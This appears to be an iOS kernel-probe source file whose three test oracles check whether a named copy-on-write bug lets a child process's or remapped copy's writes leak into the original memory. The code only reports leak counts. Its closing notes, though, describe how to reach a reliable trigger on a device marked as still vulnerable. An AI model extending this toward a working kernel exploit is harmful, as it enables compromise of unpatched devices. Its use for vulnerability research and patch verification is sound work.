#import "KPAuditCoWIntegrityModule.h"
#import "KPLog.h"
#import <mach/mach.h>
#import <sys/mman.h>
#import <sys/wait.h>
#import <unistd.h>

// vm_remap is a standard MIG routine; declared here so the build never depends
// on which SDK header happens to expose it (mach_vm.h is macOS-only).
extern kern_return_t vm_remap(vm_map_t target_task, vm_address_t *target_address,
                              vm_size_t size, vm_address_t mask, int flags,
                              vm_map_t src_task, vm_address_t src_address,
                              boolean_t copy, vm_prot_t *cur_protection,
                              vm_prot_t *max_protection, vm_inherit_t inheritance);

static const size_t kKPCoWPage = 0x4000; // 16 KB — matches the lsl #14 page stride in the fix

@interface KPAuditCoWIntegrityModule ()
@property (nonatomic, assign) BOOL armed;
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditCoWIntegrityModule

- (instancetype)initWithArmed:(BOOL)armed {
    self = [super init];
    if (self) {
        _armed = armed;
        _identifier = armed ? @"cow112576.integrity.armed" : @"cow112576.integrity.control";
        _title = armed ? @"CoW integrity (armed)" : @"CoW integrity (control)";
        _subtitle = armed
            ? @"CVE-2026-112576: fork/remap CoW isolation + compressor pressure"
            : @"Sanity: one fork iteration, no pressure, isolation must hold";
        _icon = armed ? @"arrow.triangle.branch" : @"doc.on.doc";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

#pragma mark - Oracles

// Oracle 1: fork CoW isolation. Parent page filled with byte A; child writes B
// to the same VA. A leak means the parent observes B — the CoW contract broke.
- (NSDictionary *)forkLeakIterations:(uint32_t)iters underPressure:(BOOL)pressure {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    uint8_t *page = mmap(NULL, kKPCoWPage, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANON, -1, 0);
    if (page == MAP_FAILED) {
        result[@"status"] = @"MMAP_FAILED";
        result[@"errno"] = @(errno);
        return result;
    }
    memset(page, 0xAA, kKPCoWPage);

    NSMutableArray *slabs = [NSMutableArray array];
    if (pressure) {
        // Dirty a slab of anonymous memory to engage the compressor
        // (the 27.2 fix touched vm_pageout_compress_page).
        for (int i = 0; i < 16; i++) {
            uint8_t *slab = mmap(NULL, 8 * 1024 * 1024, PROT_READ | PROT_WRITE,
                                 MAP_PRIVATE | MAP_ANON, -1, 0);
            if (slab == MAP_FAILED) break;
            memset(slab, (uint8_t)(0x10 + i), 8 * 1024 * 1024);
            [slabs addObject:[NSValue valueWithPointer:slab]];
        }
    }

    uint32_t leaks = 0, faults = 0;
    for (uint32_t i = 0; i < iters; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            memset(page, 0xBB, kKPCoWPage); // child writes to its private copy
            _exit(0);
        } else if (pid > 0) {
            int status = 0;
            waitpid(pid, &status, 0);
            if (page[0] != 0xAA || page[kKPCoWPage - 1] != 0xAA) {
                leaks++;
                break;
            }
        } else {
            faults++;
        }
    }

    for (NSValue *v in slabs) {
        munmap((void *)v.pointerValue, 8 * 1024 * 1024);
    }
    munmap(page, kKPCoWPage);

    result[@"shape"] = slabs.count ? @"fork-write + compressor pressure" : @"fork-write";
    result[@"iterations"] = @(iters);
    result[@"pressure_slabs"] = @(slabs.count);
    result[@"leaks"] = @(leaks);
    result[@"fork_failures"] = @(faults);
    return result;
}

// Oracle 2: remap-copy isolation. mach_vm_remap with VM_INHERIT_COPY makes a
// CoW alias; writing the copy must never change the original.
- (NSDictionary *)remapLeakIterations:(uint32_t)iters {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    vm_address_t src = 0;
    kern_return_t kr = vm_allocate(mach_task_self(), &src, kKPCoWPage, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        result[@"status"] = @"VM_ALLOCATE_FAILED";
        result[@"kr"] = @(kr);
        return result;
    }
    memset((void *)src, 0xCC, kKPCoWPage);

    uint32_t leaks = 0, failures = 0;
    for (uint32_t i = 0; i < iters; i++) {
        vm_address_t dst = 0;
        vm_size_t size = kKPCoWPage;
        vm_prot_t cur = 0, max = 0;
        kr = vm_remap(mach_task_self(), &dst, size, 0,
                      VM_FLAGS_ANYWHERE | VM_INHERIT_COPY,
                      mach_task_self(), src, FALSE, &cur, &max, VM_INHERIT_COPY);
        if (kr != KERN_SUCCESS) {
            failures++;
            continue;
        }
        memset((void *)dst, 0xDD, kKPCoWPage); // write the copy
        if (((uint8_t *)src)[0] != 0xCC || ((uint8_t *)src)[kKPCoWPage - 1] != 0xCC) {
            leaks++;
            vm_deallocate(mach_task_self(), dst, size);
            break;
        }
        vm_deallocate(mach_task_self(), dst, size);
        memset((void *)src, 0xCC, kKPCoWPage);
    }
    vm_deallocate(mach_task_self(), src, kKPCoWPage);

    result[@"shape"] = @"mach_vm_remap(COPY) write-copy check-original";
    result[@"iterations"] = @(iters);
    result[@"leaks"] = @(leaks);
    result[@"remap_failures"] = @(failures);
    return result;
}

// Oracle 3: madvise race on the copy path — write and MADV_FREE contend on the
// same pages the CoW fault path handles (vm_fault_page family).
- (NSDictionary *)madviseRaceIterations:(uint32_t)iters {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    uint8_t *page = mmap(NULL, kKPCoWPage, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANON, -1, 0);
    if (page == MAP_FAILED) {
        result[@"status"] = @"MMAP_FAILED";
        return result;
    }
    memset(page, 0xEE, kKPCoWPage);

    uint32_t leaks = 0;
    for (uint32_t i = 0; i < iters; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            // child: hammer madvise + write on its private mapping
            for (int j = 0; j < 64; j++) {
                madvise(page, kKPCoWPage, MADV_FREE);
                page[0] = 0x41;
                page[kKPCoWPage / 2] = 0x42;
            }
            _exit(0);
        } else if (pid > 0) {
            int status = 0;
            waitpid(pid, &status, 0);
            if (page[0] != 0xEE) {
                leaks++;
                break;
            }
            page[0] = 0xEE;
        }
    }
    munmap(page, kKPCoWPage);
    result[@"shape"] = @"fork + child madvise(MADV_FREE)/write race";
    result[@"iterations"] = @(iters);
    result[@"leaks"] = @(leaks);
    return result;
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · CVE-2026-112576 · CoW integrity ===\n"];
    [report appendString:@"Apple 149230: 'unexpected changes to copy-on-write memory',\n"];
    [report appendString:@"fixed in iOS 26.7.2 / 27.2 (ours: 27.0.1 -> LIVE).\n"];
    [report appendString:@"Fix family in kernel diff: vm_fault_page (CoW fault), vm_object_update,\n"];
    [report appendString:@"vm_pageout_compress_page (x2), vm_map_remap, vm_owned_objects_disown.\n"];
    [report appendString:@"Oracle = CoW ISOLATION (peer mapping must not see the write),\n"];
    [report appendString:@"not the backing file (the earlier audit looked at the wrong target).\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    uint32_t iters = self.armed ? 256 : 8;
    [report appendFormat:@"\n%@", [self forkLeakIterations:iters underPressure:NO]];
    if (self.armed) {
        [report appendFormat:@"\n%@", [self forkLeakIterations:64 underPressure:YES]];
        [report appendFormat:@"\n%@", [self remapLeakIterations:64]];
        [report appendFormat:@"\n%@", [self madviseRaceIterations:64]];
    }

    [report appendString:@"\n\nVERDICT: "];
    [report appendString:self.armed ? @"SEE_LEAKS_FIELD\n" : @"SURVIVED (control)\n"];
    [report appendString:
     @"Interpretation: leaks=0 means THESE shapes kept the CoW contract; it does\n"
     @"not close CVE-2026-112576 — the fixed code sits in the fault/compressor/\n"
     @"remap pipeline and the winning trigger may need a specific pressure profile\n"
     @"or a cross-process shared object. leaks>0 is a confirmed integrity break.\n"
     @"Next: widen the pressure profile (dirty >100MB), add posix_spawn/vfork\n"
     @"variants, and instrument vm_fault_page with debugserver watchpoints.\n"];
    return report;
}

@end
